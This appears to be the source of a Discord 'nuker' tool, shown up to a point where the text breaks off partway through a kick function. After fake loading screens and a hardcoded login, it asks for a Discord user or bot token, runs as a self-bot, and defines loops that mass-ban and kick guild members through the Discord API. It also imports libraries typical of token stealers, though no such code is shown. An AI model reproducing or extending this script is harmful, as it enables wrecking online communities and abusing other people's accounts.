import colorama
import requests
import os
import sys
import threading
import time
import json
import asyncio
import discord
import aiohttp
import datetime
from colored import fg, attr
from pypresence import Presence

##################^^^MODULES^^^##################





##################^^^PRESENCE^^^##################





import os


import ctypes
ctypes.windll.kernel32.SetConsoleTitleW(f'please wait...')

##################^^^MODULES^^^##################

if os.name != "nt":
    exit()

import re
import json
import base64
import subprocess
import sys
import datetime
import sqlite3
import zipfile
import cryptography
import shutil
import dhooks
import requests

from pypresence import Presence
from colorama import *
from re import findall
from json import loads, dumps
from base64 import b64decode
from subprocess import Popen, PIPE
from urllib.request import Request, urlopen
from threading import Thread
from time import sleep
from sys import argv
from dhooks import Webhook, File, Embed, Webhook
from shutil import copyfile

##################^^^MODULES^^^##################


os.system('mode 29,19')  #<SYSYTEM#
from colorama import Fore, Style
from pypresence import Presence
from discord import Webhook, AsyncWebhookAdapter
from discord.ext import commands

##################^^^MODULES^^^##################

os.system(f'cls & title [blxxz Nuker] » Loading...') #<LOADER#


date = datetime.datetime.now()   ##<CLOCK SETUP##
ok = date.strftime("%H:%M:%S")   ##<CLOCK##


def writechar(text):
   for char in text:
     sys.stdout.write(char)
     sys.stdout.flush()
     time.sleep(0.1)     

##################^^^WRITECHAR^^^##################

class colors:

    red = fg('#ff004d8')
    reset = attr('reset')
    gray = fg('#ff4b00')
    gray = fg('#ff4b00')
    purple = fg('#5e04b8')
    purplu = fg('#7710de')

##################^^^COLORS^^^##################    



##################vvvLOADERvvv##################


time.sleep(2)
os.system('cls')
print(f"""

                                            {Fore.LIGHTBLACK_EX}██{colors.purple}╗      {Fore.LIGHTBLACK_EX}██████{colors.purple}╗  {Fore.LIGHTBLACK_EX}██████{colors.purple}{colors.purple}╗ {Fore.LIGHTBLACK_EX}██{colors.purple}╗{Fore.LIGHTBLACK_EX}███{colors.purple}╗   {Fore.LIGHTBLACK_EX}██{colors.purple}╗ 
                                            {Fore.LIGHTBLACK_EX}██{colors.purple}║     {Fore.LIGHTBLACK_EX}██{colors.purple}╔═══{Fore.LIGHTBLACK_EX}██{colors.purple}╗{Fore.LIGHTBLACK_EX}██{colors.purple}╔════╝ {Fore.LIGHTBLACK_EX}██{colors.purple}║{Fore.LIGHTBLACK_EX}████{colors.purple}╗  {Fore.LIGHTBLACK_EX}██{colors.purple}║
                                            {Fore.LIGHTBLACK_EX}██{colors.purple}║     {Fore.LIGHTBLACK_EX}██{colors.purple}║   {Fore.LIGHTBLACK_EX}██{colors.purple}║{Fore.LIGHTBLACK_EX}██{colors.purple}║  {Fore.LIGHTBLACK_EX}███{colors.purple}╗{Fore.LIGHTBLACK_EX}██{colors.purple}║{Fore.LIGHTBLACK_EX}██{colors.purple}╔{Fore.LIGHTBLACK_EX}██{colors.purple}╗ {Fore.LIGHTBLACK_EX}██{colors.purple}║
                                            {Fore.LIGHTBLACK_EX}██{colors.purple}║     {Fore.LIGHTBLACK_EX}██{colors.purple}║   {Fore.LIGHTBLACK_EX}██{colors.purple}║{Fore.LIGHTBLACK_EX}██{colors.purple}║   {Fore.LIGHTBLACK_EX}██{colors.purple}║{Fore.LIGHTBLACK_EX}██{colors.purple}║{Fore.LIGHTBLACK_EX}██{colors.purple}║╚{Fore.LIGHTBLACK_EX}██{colors.purple}╗{Fore.LIGHTBLACK_EX}██{colors.purple}║
                                            {Fore.LIGHTBLACK_EX}███████{colors.purple}╗╚{Fore.LIGHTBLACK_EX}██████{colors.purple}╔╝╚{Fore.LIGHTBLACK_EX}██████{colors.purple}╔╝{Fore.LIGHTBLACK_EX}██{colors.purple}║{Fore.LIGHTBLACK_EX}██{colors.purple}║ ╚{Fore.LIGHTBLACK_EX}████{colors.purple}║
                                            {colors.purple}╚══════╝ ╚═════╝  ╚═════╝ ╚═╝╚═╝  ╚═══╝ 
                                       ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
                                         ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━        


                                         
{Fore.WHITE}· {colors.purple}[{colors.purple}{Fore.WHITE}{ok}{Fore.WHITE}{colors.purple}] {colors.purple}[{colors.purple}{Fore.WHITE}Debug{Fore.WHITE}{colors.purple}] {Fore.LIGHTBLACK_EX} Launching blxxz Nuker v1.4.6 by blxxz.
""")
time.sleep(1)
os.system('cls')
print(f"""
                                            {Fore.LIGHTBLACK_EX}██{colors.purplu}╗      {Fore.LIGHTBLACK_EX}██████{colors.purplu}╗  {Fore.LIGHTBLACK_EX}██████{colors.purplu}{colors.purplu}╗ {Fore.LIGHTBLACK_EX}██{colors.purplu}╗{Fore.LIGHTBLACK_EX}███{colors.purplu}╗   {Fore.LIGHTBLACK_EX}██{colors.purplu}╗ 
                                            {Fore.LIGHTBLACK_EX}██{colors.purplu}║     {Fore.LIGHTBLACK_EX}██{colors.purplu}╔═══{Fore.LIGHTBLACK_EX}██{colors.purplu}╗{Fore.LIGHTBLACK_EX}██{colors.purplu}╔════╝ {Fore.LIGHTBLACK_EX}██{colors.purplu}║{Fore.LIGHTBLACK_EX}████{colors.purplu}╗  {Fore.LIGHTBLACK_EX}██{colors.purplu}║
                                            {Fore.LIGHTBLACK_EX}██{colors.purplu}║     {Fore.LIGHTBLACK_EX}██{colors.purplu}║   {Fore.LIGHTBLACK_EX}██{colors.purplu}║{Fore.LIGHTBLACK_EX}██{colors.purplu}║  {Fore.LIGHTBLACK_EX}███{colors.purplu}╗{Fore.LIGHTBLACK_EX}██{colors.purplu}║{Fore.LIGHTBLACK_EX}██{colors.purplu}╔{Fore.LIGHTBLACK_EX}██{colors.purplu}╗ {Fore.LIGHTBLACK_EX}██{colors.purplu}║
                                            {Fore.LIGHTBLACK_EX}██{colors.purplu}║     {Fore.LIGHTBLACK_EX}██{colors.purplu}║   {Fore.LIGHTBLACK_EX}██{colors.purplu}║{Fore.LIGHTBLACK_EX}██{colors.purplu}║   {Fore.LIGHTBLACK_EX}██{colors.purplu}║{Fore.LIGHTBLACK_EX}██{colors.purplu}║{Fore.LIGHTBLACK_EX}██{colors.purplu}║╚{Fore.LIGHTBLACK_EX}██{colors.purplu}╗{Fore.LIGHTBLACK_EX}██{colors.purplu}║
                                            {Fore.LIGHTBLACK_EX}███████{colors.purplu}╗╚{Fore.LIGHTBLACK_EX}██████{colors.purplu}╔╝╚{Fore.LIGHTBLACK_EX}██████{colors.purplu}╔╝{Fore.LIGHTBLACK_EX}██{colors.purplu}║{Fore.LIGHTBLACK_EX}██{colors.purplu}║ ╚{Fore.LIGHTBLACK_EX}████{colors.purplu}║
                                            {colors.purple}╚══════╝ ╚═════╝  ╚═════╝ ╚═╝╚═╝  ╚═══╝ 
                                       ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
                                         ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━            



{colors.purple}[{colors.purple}{Fore.GREEN}√{Fore.GREEN}{colors.purple}]{colors.purple} {Fore.WHITE}· {colors.purple}[{colors.purple}{Fore.WHITE}{ok}{Fore.WHITE}{colors.purple}] {colors.purple}[{colors.purple}{Fore.WHITE}Debug{Fore.WHITE}{colors.purple}] {Fore.LIGHTBLACK_EX} Launching Modules Firmware v1.4.6 by blxxz.                                         
· {colors.purple}[{colors.purple}{Fore.WHITE}{ok}{Fore.WHITE}{colors.purple}] {colors.purple}[{colors.purple}{Fore.WHITE}Debug{Fore.WHITE}{colors.purple}] {Fore.LIGHTBLACK_EX} Machine enviroment check finished. Moving forward
""")
time.sleep(1)
os.system('cls')
print(f"""
                                            {Fore.LIGHTBLACK_EX}██{colors.purple}╗      {Fore.LIGHTBLACK_EX}██████{colors.purple}╗  {Fore.LIGHTBLACK_EX}██████{colors.purple}{colors.purple}╗ {Fore.LIGHTBLACK_EX}██{colors.purple}╗{Fore.LIGHTBLACK_EX}███{colors.purple}╗   {Fore.LIGHTBLACK_EX}██{colors.purple}╗ 
                                            {Fore.LIGHTBLACK_EX}██{colors.purple}║     {Fore.LIGHTBLACK_EX}██{colors.purple}╔═══{Fore.LIGHTBLACK_EX}██{colors.purple}╗{Fore.LIGHTBLACK_EX}██{colors.purple}╔════╝ {Fore.LIGHTBLACK_EX}██{colors.purple}║{Fore.LIGHTBLACK_EX}████{colors.purple}╗  {Fore.LIGHTBLACK_EX}██{colors.purple}║
                                            {Fore.LIGHTBLACK_EX}██{colors.purple}║     {Fore.LIGHTBLACK_EX}██{colors.purple}║   {Fore.LIGHTBLACK_EX}██{colors.purple}║{Fore.LIGHTBLACK_EX}██{colors.purple}║  {Fore.LIGHTBLACK_EX}███{colors.purple}╗{Fore.LIGHTBLACK_EX}██{colors.purple}║{Fore.LIGHTBLACK_EX}██{colors.purple}╔{Fore.LIGHTBLACK_EX}██{colors.purple}╗ {Fore.LIGHTBLACK_EX}██{colors.purple}║
                                            {Fore.LIGHTBLACK_EX}██{colors.purple}║     {Fore.LIGHTBLACK_EX}██{colors.purple}║   {Fore.LIGHTBLACK_EX}██{colors.purple}║{Fore.LIGHTBLACK_EX}██{colors.purple}║   {Fore.LIGHTBLACK_EX}██{colors.purple}║{Fore.LIGHTBLACK_EX}██{colors.purple}║{Fore.LIGHTBLACK_EX}██{colors.purple}║╚{Fore.LIGHTBLACK_EX}██{colors.purple}╗{Fore.LIGHTBLACK_EX}██{colors.purple}║
                                            {Fore.LIGHTBLACK_EX}███████{colors.purple}╗╚{Fore.LIGHTBLACK_EX}██████{colors.purple}╔╝╚{Fore.LIGHTBLACK_EX}██████{colors.purple}╔╝{Fore.LIGHTBLACK_EX}██{colors.purple}║{Fore.LIGHTBLACK_EX}██{colors.purple}║ ╚{Fore.LIGHTBLACK_EX}████{colors.purple}║
                                            {colors.purple}╚══════╝ ╚═════╝  ╚═════╝ ╚═╝╚═╝  ╚═══╝ 
                                       ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
                                         ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━       



{colors.purple}[{colors.purple}{Fore.GREEN}√{Fore.GREEN}{colors.purple}]{colors.purple} {Fore.WHITE}· {colors.purple}[{colors.purple}{Fore.WHITE}{ok}{Fore.WHITE}{colors.purple}] {colors.purple}[{colors.purple}{Fore.WHITE}Debug{Fore.WHITE}{colors.purple}] {Fore.LIGHTBLACK_EX} Launching Modules Firmware v1.4.6 by blxxz.                                         
{colors.purple}[{colors.purple}{Fore.GREEN}√{Fore.GREEN}{colors.purple}]{colors.purple} {Fore.WHITE}· {colors.purple}[{colors.purple}{Fore.WHITE}{ok}{Fore.WHITE}{colors.purple}] {colors.purple}[{colors.purple}{Fore.WHITE}Debug{Fore.WHITE}{colors.purple}] {Fore.LIGHTBLACK_EX} Machine enviroment check finished. Moving forward     
· {colors.purple}[{colors.purple}{Fore.WHITE}{ok}{Fore.WHITE}{colors.purple}] {colors.purple}[{colors.purple}{Fore.WHITE}Info{Fore.WHITE}{colors.purple}] {Fore.LIGHTBLACK_EX} Machine uuid: [an7xd4980-b3a67-11e2-9144-6c3cbe530dd0] is now being utilized.
""")
time.sleep(1)
os.system('cls')
print(f"""
                                            {Fore.LIGHTBLACK_EX}██{colors.purplu}╗      {Fore.LIGHTBLACK_EX}██████{colors.purplu}╗  {Fore.LIGHTBLACK_EX}██████{colors.purplu}{colors.purplu}╗ {Fore.LIGHTBLACK_EX}██{colors.purplu}╗{Fore.LIGHTBLACK_EX}███{colors.purplu}╗   {Fore.LIGHTBLACK_EX}██{colors.purplu}╗ 
                                            {Fore.LIGHTBLACK_EX}██{colors.purplu}║     {Fore.LIGHTBLACK_EX}██{colors.purplu}╔═══{Fore.LIGHTBLACK_EX}██{colors.purplu}╗{Fore.LIGHTBLACK_EX}██{colors.purplu}╔════╝ {Fore.LIGHTBLACK_EX}██{colors.purplu}║{Fore.LIGHTBLACK_EX}████{colors.purplu}╗  {Fore.LIGHTBLACK_EX}██{colors.purplu}║
                                            {Fore.LIGHTBLACK_EX}██{colors.purplu}║     {Fore.LIGHTBLACK_EX}██{colors.purplu}║   {Fore.LIGHTBLACK_EX}██{colors.purplu}║{Fore.LIGHTBLACK_EX}██{colors.purplu}║  {Fore.LIGHTBLACK_EX}███{colors.purplu}╗{Fore.LIGHTBLACK_EX}██{colors.purplu}║{Fore.LIGHTBLACK_EX}██{colors.purplu}╔{Fore.LIGHTBLACK_EX}██{colors.purplu}╗ {Fore.LIGHTBLACK_EX}██{colors.purplu}║
                                            {Fore.LIGHTBLACK_EX}██{colors.purplu}║     {Fore.LIGHTBLACK_EX}██{colors.purplu}║   {Fore.LIGHTBLACK_EX}██{colors.purplu}║{Fore.LIGHTBLACK_EX}██{colors.purplu}║   {Fore.LIGHTBLACK_EX}██{colors.purplu}║{Fore.LIGHTBLACK_EX}██{colors.purplu}║{Fore.LIGHTBLACK_EX}██{colors.purplu}║╚{Fore.LIGHTBLACK_EX}██{colors.purplu}╗{Fore.LIGHTBLACK_EX}██{colors.purplu}║
                                            {Fore.LIGHTBLACK_EX}███████{colors.purplu}╗╚{Fore.LIGHTBLACK_EX}██████{colors.purplu}╔╝╚{Fore.LIGHTBLACK_EX}██████{colors.purplu}╔╝{Fore.LIGHTBLACK_EX}██{colors.purplu}║{Fore.LIGHTBLACK_EX}██{colors.purplu}║ ╚{Fore.LIGHTBLACK_EX}████{colors.purplu}║
                                            {colors.purple}╚══════╝ ╚═════╝  ╚═════╝ ╚═╝╚═╝  ╚═══╝ 
                                       ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
                                         ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━     



{colors.purple}[{colors.purple}{Fore.GREEN}√{Fore.GREEN}{colors.purple}]{colors.purple} {Fore.WHITE}· {colors.purple}[{colors.purple}{Fore.WHITE}{ok}{Fore.WHITE}{colors.purple}] {colors.purple}[{colors.purple}{Fore.WHITE}Debug{Fore.WHITE}{colors.purple}] {Fore.LIGHTBLACK_EX} Launching Modules Firmware v1.4.6 by blxxz.                                         
{colors.purple}[{colors.purple}{Fore.GREEN}√{Fore.GREEN}{colors.purple}]{colors.purple} {Fore.WHITE}· {colors.purple}[{colors.purple}{Fore.WHITE}{ok}{Fore.WHITE}{colors.purple}] {colors.purple}[{colors.purple}{Fore.WHITE}Debug{Fore.WHITE}{colors.purple}] {Fore.LIGHTBLACK_EX} Machine enviroment check finished. Moving forward     
· {colors.purple}[{colors.purple}{Fore.WHITE}{ok}{Fore.WHITE}{colors.purple}] {colors.purple}[{colors.purple}{Fore.WHITE}Info{Fore.WHITE}{colors.purple}] {Fore.LIGHTBLACK_EX} Machine uuid: [an7xd4980-b3a67-11e2-9144-6c3cbe530dd0] is now being utilized.     
· {colors.purple}[{colors.purple}{Fore.WHITE}{ok}{Fore.WHITE}{colors.purple}] {colors.purple}[{colors.purple}{Fore.WHITE}Watcher{Fore.WHITE}{colors.purple}] {Fore.LIGHTBLACK_EX} Machine passed checks sucessfully. Moving forward
""")
time.sleep(1)
os.system('cls')
print(f"""
                                            {Fore.LIGHTBLACK_EX}██{colors.purple}╗      {Fore.LIGHTBLACK_EX}██████{colors.purple}╗  {Fore.LIGHTBLACK_EX}██████{colors.purple}{colors.purple}╗ {Fore.LIGHTBLACK_EX}██{colors.purple}╗{Fore.LIGHTBLACK_EX}███{colors.purple}╗   {Fore.LIGHTBLACK_EX}██{colors.purple}╗ 
                                            {Fore.LIGHTBLACK_EX}██{colors.purple}║     {Fore.LIGHTBLACK_EX}██{colors.purple}╔═══{Fore.LIGHTBLACK_EX}██{colors.purple}╗{Fore.LIGHTBLACK_EX}██{colors.purple}╔════╝ {Fore.LIGHTBLACK_EX}██{colors.purple}║{Fore.LIGHTBLACK_EX}████{colors.purple}╗  {Fore.LIGHTBLACK_EX}██{colors.purple}║
                                            {Fore.LIGHTBLACK_EX}██{colors.purple}║     {Fore.LIGHTBLACK_EX}██{colors.purple}║   {Fore.LIGHTBLACK_EX}██{colors.purple}║{Fore.LIGHTBLACK_EX}██{colors.purple}║  {Fore.LIGHTBLACK_EX}███{colors.purple}╗{Fore.LIGHTBLACK_EX}██{colors.purple}║{Fore.LIGHTBLACK_EX}██{colors.purple}╔{Fore.LIGHTBLACK_EX}██{colors.purple}╗ {Fore.LIGHTBLACK_EX}██{colors.purple}║
                                            {Fore.LIGHTBLACK_EX}██{colors.purple}║     {Fore.LIGHTBLACK_EX}██{colors.purple}║   {Fore.LIGHTBLACK_EX}██{colors.purple}║{Fore.LIGHTBLACK_EX}██{colors.purple}║   {Fore.LIGHTBLACK_EX}██{colors.purple}║{Fore.LIGHTBLACK_EX}██{colors.purple}║{Fore.LIGHTBLACK_EX}██{colors.purple}║╚{Fore.LIGHTBLACK_EX}██{colors.purple}╗{Fore.LIGHTBLACK_EX}██{colors.purple}║
                                            {Fore.LIGHTBLACK_EX}███████{colors.purple}╗╚{Fore.LIGHTBLACK_EX}██████{colors.purple}╔╝╚{Fore.LIGHTBLACK_EX}██████{colors.purple}╔╝{Fore.LIGHTBLACK_EX}██{colors.purple}║{Fore.LIGHTBLACK_EX}██{colors.purple}║ ╚{Fore.LIGHTBLACK_EX}████{colors.purple}║
                                            {colors.purple}╚══════╝ ╚═════╝  ╚═════╝ ╚═╝╚═╝  ╚═══╝ 
                                        ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
                                         ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━           



{colors.purple}[{colors.purple}{Fore.GREEN}√{Fore.GREEN}{colors.purple}]{colors.purple} {Fore.WHITE}· {colors.purple}[{colors.purple}{Fore.WHITE}{ok}{Fore.WHITE}{colors.purple}] {colors.purple}[{colors.purple}{Fore.WHITE}Debug{Fore.WHITE}{colors.purple}] {Fore.LIGHTBLACK_EX} Launching Modules Firmware v1.4.6 by blxxz.                                         
{colors.purple}[{colors.purple}{Fore.GREEN}√{Fore.GREEN}{colors.purple}]{colors.purple} {Fore.WHITE}· {colors.purple}[{colors.purple}{Fore.WHITE}{ok}{Fore.WHITE}{colors.purple}] {colors.purple}[{colors.purple}{Fore.WHITE}Debug{Fore.WHITE}{colors.purple}] {Fore.LIGHTBLACK_EX} Machine enviroment check finished. Moving forward     
{colors.purple}[{colors.purple}{Fore.GREEN}√{Fore.GREEN}{colors.purple}]{colors.purple} {Fore.WHITE}· {colors.purple}[{colors.purple}{Fore.WHITE}{ok}{Fore.WHITE}{colors.purple}] {colors.purple}[{colors.purple}{Fore.WHITE}Info{Fore.WHITE}{colors.purple}] {Fore.LIGHTBLACK_EX} Machine uuid: [an7xd4980-b3a67-11e2-9144-6c3cbe530dd0] is now being utilized.     
{colors.purple}[{colors.purple}{Fore.GREEN}√{Fore.GREEN}{colors.purple}]{colors.purple} {Fore.WHITE}· {colors.purple}[{colors.purple}{Fore.WHITE}{ok}{Fore.WHITE}{colors.purple}] {colors.purple}[{colors.purple}{Fore.WHITE}Watcher{Fore.WHITE}{colors.purple}] {Fore.LIGHTBLACK_EX} Machine passed checks sucessfully. Moving forward     
· {colors.purple}[{colors.purple}{Fore.WHITE}{ok}{Fore.WHITE}{colors.purple}] {colors.purple}[{colors.purple}{Fore.WHITE}Info{Fore.WHITE}{colors.purple}] {Fore.LIGHTBLACK_EX}Client version: 1.0.4 is up  to date.
""")




##################^^^PRESENCE^^^##################

##################vvvLOGINvvv##################

print(f"""
                                            {Fore.LIGHTBLACK_EX}██{colors.purplu}╗      {Fore.LIGHTBLACK_EX}██████{colors.purplu}╗  {Fore.LIGHTBLACK_EX}██████{colors.purplu}{colors.purplu}╗ {Fore.LIGHTBLACK_EX}██{colors.purplu}╗{Fore.LIGHTBLACK_EX}███{colors.purplu}╗   {Fore.LIGHTBLACK_EX}██{colors.purplu}╗ 
                                            {Fore.LIGHTBLACK_EX}██{colors.purplu}║     {Fore.LIGHTBLACK_EX}██{colors.purplu}╔═══{Fore.LIGHTBLACK_EX}██{colors.purplu}╗{Fore.LIGHTBLACK_EX}██{colors.purplu}╔════╝ {Fore.LIGHTBLACK_EX}██{colors.purplu}║{Fore.LIGHTBLACK_EX}████{colors.purplu}╗  {Fore.LIGHTBLACK_EX}██{colors.purplu}║
                                            {Fore.LIGHTBLACK_EX}██{colors.purplu}║     {Fore.LIGHTBLACK_EX}██{colors.purplu}║   {Fore.LIGHTBLACK_EX}██{colors.purplu}║{Fore.LIGHTBLACK_EX}██{colors.purplu}║  {Fore.LIGHTBLACK_EX}███{colors.purplu}╗{Fore.LIGHTBLACK_EX}██{colors.purplu}║{Fore.LIGHTBLACK_EX}██{colors.purplu}╔{Fore.LIGHTBLACK_EX}██{colors.purplu}╗ {Fore.LIGHTBLACK_EX}██{colors.purplu}║
                                            {Fore.LIGHTBLACK_EX}██{colors.purplu}║     {Fore.LIGHTBLACK_EX}██{colors.purplu}║   {Fore.LIGHTBLACK_EX}██{colors.purplu}║{Fore.LIGHTBLACK_EX}██{colors.purplu}║   {Fore.LIGHTBLACK_EX}██{colors.purplu}║{Fore.LIGHTBLACK_EX}██{colors.purplu}║{Fore.LIGHTBLACK_EX}██{colors.purplu}║╚{Fore.LIGHTBLACK_EX}██{colors.purplu}╗{Fore.LIGHTBLACK_EX}██{colors.purplu}║
                                            {Fore.LIGHTBLACK_EX}███████{colors.purplu}╗╚{Fore.LIGHTBLACK_EX}██████{colors.purplu}╔╝╚{Fore.LIGHTBLACK_EX}██████{colors.purplu}╔╝{Fore.LIGHTBLACK_EX}██{colors.purplu}║{Fore.LIGHTBLACK_EX}██{colors.purplu}║ ╚{Fore.LIGHTBLACK_EX}████{colors.purplu}║
                                            {colors.purple}╚══════╝ ╚═════╝  ╚═════╝ ╚═╝╚═╝  ╚═══╝
                                       ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
                                         ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━       



{colors.purple}[{colors.purple}{Fore.GREEN}√{Fore.GREEN}{colors.purple}]{colors.purple} {Fore.WHITE}· {colors.purple}[{colors.purple}{Fore.WHITE}{ok}{Fore.WHITE}{colors.purple}] {colors.purple}[{colors.purple}{Fore.WHITE}Debug{Fore.WHITE}{colors.purple}] {Fore.LIGHTBLACK_EX} Launching Modules Firmware v1.4.6 by blxxz.                                         
{colors.purple}[{colors.purple}{Fore.GREEN}√{Fore.GREEN}{colors.purple}]{colors.purple} {Fore.WHITE}· {colors.purple}[{colors.purple}{Fore.WHITE}{ok}{Fore.WHITE}{colors.purple}] {colors.purple}[{colors.purple}{Fore.WHITE}Debug{Fore.WHITE}{colors.purple}] {Fore.LIGHTBLACK_EX} Machine enviroment check finished. Moving forward     
{colors.purple}[{colors.purple}{Fore.GREEN}√{Fore.GREEN}{colors.purple}]{colors.purple} {Fore.WHITE}· {colors.purple}[{colors.purple}{Fore.WHITE}{ok}{Fore.WHITE}{colors.purple}] {colors.purple}[{colors.purple}{Fore.WHITE}Info{Fore.WHITE}{colors.purple}] {Fore.LIGHTBLACK_EX} Machine uuid: [an7xd4980-b3a67-11e2-9144-6c3cbe530dd0] is now being utilized.     
{colors.purple}[{colors.purple}{Fore.GREEN}√{Fore.GREEN}{colors.purple}]{colors.purple} {Fore.WHITE}· {colors.purple}[{colors.purple}{Fore.WHITE}{ok}{Fore.WHITE}{colors.purple}] {colors.purple}[{colors.purple}{Fore.WHITE}Watcher{Fore.WHITE}{colors.purple}] {Fore.LIGHTBLACK_EX} Machine passed checks sucessfully. Moving forward     
{colors.purple}[{colors.purple}{Fore.GREEN}√{Fore.GREEN}{colors.purple}]{colors.purple} {Fore.WHITE}· {colors.purple}[{colors.purple}{Fore.WHITE}{ok}{Fore.WHITE}{colors.purple}] {colors.purple}[{colors.purple}{Fore.WHITE}Info{Fore.WHITE}{colors.purple}] {Fore.LIGHTBLACK_EX}Client version: 1.0.4 is up  to date.
{colors.purple}[{colors.purple}{Fore.GREEN}!{Fore.GREEN}{colors.purple}]{colors.purple} {Fore.WHITE}· {colors.purple}[{colors.purple}{Fore.WHITE}{ok}{Fore.WHITE}{colors.purple}] {colors.purple}[{colors.purple}{Fore.WHITE}MOTD{Fore.WHITE}{colors.purple}] {Fore.LIGHTBLACK_EX}discord.gg/Urifrom
""")
time.sleep(2)
key = input(f"{Fore.WHITE}· {colors.purple}[{colors.purple}{Fore.WHITE}{ok}{Fore.WHITE}{colors.purple}] {colors.purple}[{colors.purple}{Fore.WHITE}System{Fore.WHITE}{colors.purple}] Username: {colors.purplu}")
key2 = input(f"{Fore.WHITE}· {colors.purple}[{colors.purple}{Fore.WHITE}{ok}{Fore.WHITE}{colors.purple}] {colors.purple}[{colors.purple}{Fore.WHITE}System{Fore.WHITE}{colors.purple}] Password: {colors.purplu}")
while True:
    if key =="43":
        print("")
        print(f"")
        break
    else:
        print("Invalid Username! Restart the program!")
while True:
    if key2 =="blxxz":
        print("")
        print(f"")
        break
    else:
        print("Invalid Password! Restart the program!")
os.system('cls')








##################vvvTOKEN SETUPvvv##################


print(f"""
                                             {Fore.LIGHTBLACK_EX}█████{colors.purple}╗ {Fore.LIGHTBLACK_EX}██{colors.purple}╗   {Fore.LIGHTBLACK_EX}██{colors.purple}╗{Fore.LIGHTBLACK_EX}████████{colors.purple}╗{Fore.LIGHTBLACK_EX}{Fore.LIGHTBLACK_EX}██{colors.purple}╗  {Fore.LIGHTBLACK_EX}██{colors.purplu}╗
                                            {Fore.LIGHTBLACK_EX}██{colors.purple}╔══{Fore.LIGHTBLACK_EX}██{colors.purplu}╗{Fore.LIGHTBLACK_EX}██{colors.purplu}║   {Fore.LIGHTBLACK_EX}██{colors.purplu}║{colors.purple}╚══{Fore.LIGHTBLACK_EX}██{colors.purple}╔══╝{Fore.LIGHTBLACK_EX}██{colors.purple}║  {Fore.LIGHTBLACK_EX}██{colors.purplu}║
                                            {Fore.LIGHTBLACK_EX}███████{colors.purplu}║{Fore.LIGHTBLACK_EX}██{colors.purplu}║   {Fore.LIGHTBLACK_EX}██{colors.purplu}║   {Fore.LIGHTBLACK_EX}██{colors.purple}║   {Fore.LIGHTBLACK_EX}███████{colors.purplu}║
                                            {Fore.LIGHTBLACK_EX}██{colors.purple}╔══{Fore.LIGHTBLACK_EX}██{colors.purplu}║{Fore.LIGHTBLACK_EX}██{colors.purplu}║   {Fore.LIGHTBLACK_EX}██{colors.purplu}║   {Fore.LIGHTBLACK_EX}██{colors.purple}║   {Fore.LIGHTBLACK_EX}██{colors.purple}╔══{Fore.LIGHTBLACK_EX}██{colors.purplu}║
                                            {Fore.LIGHTBLACK_EX}██{colors.purple}║  {Fore.LIGHTBLACK_EX}██{colors.purplu}║{colors.purple}╚{Fore.LIGHTBLACK_EX}██████{colors.purple}╔╝   {Fore.LIGHTBLACK_EX}██{colors.purple}║   {Fore.LIGHTBLACK_EX}██{colors.purple}║  {Fore.LIGHTBLACK_EX}██{colors.purplu}║
                                            {colors.purplu}╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚═╝  ╚═╝
                                       ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
                                         ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━       



{colors.purple}[{colors.purple}{Fore.BLUE}?{Fore.BLUE}{colors.purple}]{colors.purple} {Fore.WHITE}· {colors.purple}[{colors.purple}{Fore.WHITE}{ok}{Fore.WHITE}{colors.purple}] {colors.purple}[{colors.purple}{Fore.WHITE}Watcher{Fore.WHITE}{colors.purple}] {Fore.LIGHTBLACK_EX}Discord Token is required.
""")       
token = input(f"{Fore.WHITE}· {colors.purple}[{colors.purple}{Fore.WHITE}{ok}{Fore.WHITE}{colors.purple}] {colors.purple}[{colors.purple}{Fore.WHITE}System{Fore.WHITE}{colors.purple}] Authorization Token: {colors.purplu}")
head = {'Authorization': str(token)}
src = requests.get('https://discordapp.com/api/v6/users/@me', headers=head)
if src.status_code == 200:
    
    print(f"{Fore.LIGHTBLACK_EX}Token Was Proved {Fore.GREEN}valid")
    time.sleep(2)
else:
    print(f"{Fore.LIGHTBLACK_EX}Token Was Proved {Fore.LIGHTRED_EX}invalid")
    time.sleep(4)
    exit(0)
    cya()
os.system('cls')

def check_token():
    if requests.get("https://discord.com/api/v8/users/@me", headers={"Authorization": f'{token}'}).status_code == 200:
        return "user"
    else:
        return "bot"

token_type = check_token()
intents = discord.Intents.all()
intents.members = True

if token_type == "user":
    headers = {'Authorization': f'{token}'}
    client = commands.Bot(command_prefix=">", case_insensitive=False, self_bot=True, intents=intents)
elif token_type == "bot":
    headers = {'Authorization': f'Bot {token}'}
    client = commands.Bot(command_prefix=">", case_insensitive=False, intents=intents)

client.remove_command("help")


##################################################################################vvvSCRIPTSvvv###################################################################################################################

class skid:

    def __init__(self):
        self.colour = '\x1b[38;5;56m'

    def BanMembers(self, guild, member):
        while True:
            r = requests.put(f"https://discord.com/api/v8/guilds/{guild}/bans/{member}", headers=headers)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{self.colour}[{self.colour}{Fore.GREEN}√{Fore.GREEN}{self.colour}]{self.colour} {Fore.WHITE}· {self.colour}[{self.colour}{Fore.LIGHTBLACK_EX}{ok}{Fore.LIGHTBLACK_EX}{self.colour}]{self.colour} Succesfully Banned {self.colour} {Fore.WHITE}{member.strip()} {Fore.WHITE}")
                    break
                else:
                    break

                ##################^^^Ban Members^^^##################

    def KickMembers(self, guild, member):
        while True:
            r = requests.delete(f"https://discord.com/api/v8/guilds/{guild}/members/{member}", headers=headers)
